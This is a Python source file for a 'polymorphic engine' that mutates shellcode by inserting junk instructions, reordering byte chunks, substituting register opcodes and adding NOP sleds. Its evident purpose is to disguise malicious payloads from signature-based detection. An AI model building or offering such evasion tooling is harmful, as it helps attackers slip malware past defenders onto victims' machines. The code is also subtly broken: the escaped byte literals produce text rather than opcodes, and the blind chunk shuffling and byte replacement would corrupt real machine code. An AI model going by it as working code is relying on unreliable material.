import random
import struct

class PolymorphicEngine:
    def __init__(self, seed=None):
        if seed is None:
            seed = random.getrandbits(32)
        self.random = random.Random(seed)
    
    def mutate_shellcode(self, shellcode: bytes, iterations: int = 3) -> bytes:
        """Apply polymorphic mutations to shellcode"""
        mutated = bytearray(shellcode)
        
        for _ in range(iterations):
            # Choose random mutation
            mutation = self.random.choice([
                self._insert_junk_code,
                self._reorder_instructions,
                self._change_registers,
                self._add_nop_sled
            ])
            mutated = mutation(mutated)
        
        return bytes(mutated)
    
    def _insert_junk_code(self, code: bytearray) -> bytearray:
        """Insert junk instructions"""
        junk_instructions = [
            b'\\x90',                          # NOP
            b'\\x50\\x58',                    # PUSH EAX; POP EAX
            b'\\x51\\x59',                    # PUSH ECX; POP ECX
            b'\\x31\\xc0',                    # XOR EAX, EAX
            b'\\x31\\xdb',                    # XOR EBX, EBX
        ]
        
        # Insert at random position
        if len(code) > 10:
            pos = self.random.randint(0, len(code) - 1)
            junk = self.random.choice(junk_instructions)
            code[pos:pos] = junk
        
        return code
    
    def _reorder_instructions(self, code: bytearray) -> bytearray:
        """Reorder instruction blocks"""
        if len(code) < 20:
            return code
        
        # Split into 4-byte chunks and shuffle some
        chunks = [code[i:i+4] for i in range(0, len(code), 4)]
        if len(chunks) > 4:
            # Shuffle a portion of chunks
            shuffle_start = self.random.randint(0, len(chunks) - 4)
            shuffle_end = shuffle_start + self.random.randint(2, 4)
            to_shuffle = chunks[shuffle_start:shuffle_end]
            self.random.shuffle(to_shuffle)
            chunks[shuffle_start:shuffle_end] = to_shuffle
        
        return bytearray(b''.join(chunks))
    
    def _change_registers(self, code: bytearray) -> bytearray:
        """Change register usage"""
        # Simple register substitution
        substitutions = {
            b'\\x50': b'\\x51',  # PUSH EAX -> PUSH ECX
            b'\\x58': b'\\x59',  # POP EAX -> POP ECX
            b'\\xb8': b'\\xb9',  # MOV EAX -> MOV ECX
        }
        
        for old, new in substitutions.items():
            if old in code:
                pos = code.find(old)
                if pos != -1:
                    code[pos:pos+len(old)] = new
        
        return code
    
    def _add_nop_sled(self, code: bytearray) -> bytearray:
        """Add NOP sled"""
        nop_count = self.random.randint(1, 10)
        nop_sled = b'\\x90' * nop_count
        
        # Add at beginning or end
        if self.random.random() > 0.5:
            code = bytearray(nop_sled) + code
        else:
            code = code + bytearray(nop_sled)
        
        return code
